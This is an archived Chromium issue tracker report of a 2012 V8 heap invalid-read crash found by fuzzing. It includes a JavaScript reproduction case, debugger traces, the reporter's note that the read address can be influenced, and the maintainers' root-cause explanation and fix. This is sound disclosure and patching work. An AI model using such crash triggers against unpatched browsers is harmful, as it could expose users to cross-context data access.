# [LangFuzz] Crash on heap with invalid read through GetPropertyWithCallback

| Field | Value |
|-------|-------|
| **Issue ID** | [40054823](https://issues.chromium.org/issues/40054823) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals |
| **Reporter** | de...@googlemail.com |
| **Assignee** | da...@chromium.org |
| **Created** | 2012-03-12 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

The JavaScript code below crashes Chromium 19.0.1061.1 dev (and likely Chrome 17+18) and d8 shells (tested trunk, 3.7 and 3.8 branches) on the heap with an invalid read.

**VERSION**  

Chrome Version: 19.0.1061.1 dev  

Operating System: Ubuntu 11.10 64 bit

I also tested d8 shells of branches 3.7 and 3.8 and they fail the same way, so I assume that Chrome versions 17+18 are affected as well.

**REPRODUCTION CASE**  

print = function() {}  

function constructor() {};  

function assertHasOwnProperties(object, limit) {  

for (var i = 0; i < limit; i++) { }  

}  

try { Object.keys(); } catch(exc2) { print(exc2.stack); }  

var x1 = new Object();  

try { new Function ("A Man Called Horse", x1.d); } catch(exc3) { print(exc3.stack); }  

try { (-(true )).toPrecision(0x30, 'lib1-f1'); } catch(exc1) { print(exc1.stack); }

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

Program received signal SIGSEGV, Segmentation fault.  

0x00001a174673c86a in ?? ()  

(gdb) bt 8  

#0 0x00001a174673c86a in ?? ()  

#1 0x00001a1746737707 in ?? ()  

#2 0x0000043c17204121 in ?? ()  

#3 0x0000043c17204121 in ?? ()  

#4 0x0000043c17254941 in ?? ()  

#5 0x0000043c17240d51 in ?? ()  

#6 0x00007fffffffbf88 in ?? ()  

#7 0x00001a1746736543 in ?? ()  

(More stack frames follow...)  

(gdb) x /2i $pc  

=> 0x1a174673c86a: cmp %r10,-0x1(%rax)  

0x1a174673c86e: jne 0x1a174673c886  

(gdb) info register r10 rax  

r10 0x2c773ae0d0f1 48890600542449  

rax 0xffffffff00000000 -4294967296  

(gdb)

Trace from D8 with Valgrind:

==28819== Invalid read of size 8  

==28819== at 0x3CC7CD53FF8A: ???  

==28819== by 0x3CC7CD53A0A2: ???  

==28819== by 0x3CC7CD537BEA: ???  

==28819== by 0x3CC7CD536A8F: ???  

==28819== by 0x3CC7CD521C19: ???  

==28819== by 0x3CC7CD5225E8: ???  

==28819== by 0x3CC7CD50C406: ???  

==28819== by 0x3CC7CD5060F5: ???  

==28819== by 0x4671AF: v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==28819== by 0x468A0D: v8::internal::Execution::Call(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*, bool) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==28819== by 0x53B0D0: v8::internal::Object::GetPropertyWithDefinedGetter(v8::internal::Object\*, v8::internal::JSReceiver\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==28819== by 0x53B4A5: v8::internal::JSObject::GetPropertyWithCallback(v8::internal::Object\*, v8::internal::Object\*, v8::internal::String\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==28819== Address 0xfffffffeffffffff is not stack'd, malloc'd or (recently) free'd

## Timeline

### sc...@gmail.com (2012-03-13)

Danno, we're all a bit swamped with recent events. Can you look into this and confirm what versions are affected and describe the root cause a little so we can apply severity?

### sc...@gmail.com (2012-03-13)

Also adding Stefano to maximize the chances of someone seeing it :)

### km...@chromium.org (2012-03-13)

I'll take a look.

### km...@chromium.org (2012-03-13)

Fix is on the way (http://codereview.chromium.org/9691038/).

There is a missing smi (integer) check on the global object for load and calls specialized to be from a global object (not global proxy).  There is a comment in the code that such loads or calls are always "contextual" so the receiver cannot be a smi.

This comment is obviously wrong.  It relies on a pretty subtle invariant of the system that is not inforced in any way (and is not even true).

Since it seems like a micro-optimization anyway, I've restored the missing check in all cases.

Severity is a crash due to an invalid read.  I can't see how it can be anything more than that.

### de...@googlemail.com (2012-03-13)

Regarding severity:

I managed to influence the crash address, e.g. by substituting the "true" in the last line by "0x0AAAAAAA" I get:

Program received signal SIGSEGV, Segmentation fault.
0x000028728cf3ff0a in ?? ()
(gdb) x /i $pc
=> 0x28728cf3ff0a:      cmp    %r10,-0x1(%rax)
(gdb) info reg rax
rax            0xf555555600000000       -768614333541253120


So it's possible to influence the address read from. What would be the consequence of a controlled read from this address?

### km...@chromium.org (2012-03-13)

We read from that address and compare to a constant (loaded into a register on x64 and ARM, and an immediate on ia32).

If that comparison fails we enter the V8 runtime to do a slow lookup for a named property of an JS number, which is benign.

If you can guess the value that makes the comparison succeed, then you could read or call a JavaScript global property value.

The risk seems to be cross-site scripting---that you might get access to JS values from a different context.

PS: From a V8 (not necessarily security) standpoint, this is a great test case.  So good job and thanks for that.

### km...@chromium.org (2012-03-13)

Fixed in V8 r11022 (http://code.google.com/p/v8/source/detail?r=11022).

### in...@chromium.org (2012-03-13)

Can you please merge to m18 branch if this is a low impact fix.

### da...@chromium.org (2012-03-13)

Merged to 3.7 and 3.8.

### sc...@gmail.com (2012-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-14)

Thanks for the report! Seems like it'd be hard to corrupt memory from this so $500

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-03-21)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-21)

[Empty comment from Monorail migration]

### de...@googlemail.com (2012-03-23)

I saw you first announced on your blog that this is fixed in 17.0.963.83, but then later edited the post. I assume this is because the fix hasn't made it into that version? :)

### sc...@gmail.com (2012-03-23)

Yeah, an administrative error. We'll get it out in some other pending release but in the meantime the payment is still going through :)

### de...@googlemail.com (2012-03-23)

Hehe :) I wasn't worried about the money, just curious :)

### sc...@gmail.com (2012-03-27)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### sc...@gmail.com (2012-09-24)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/117794?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40054823)*
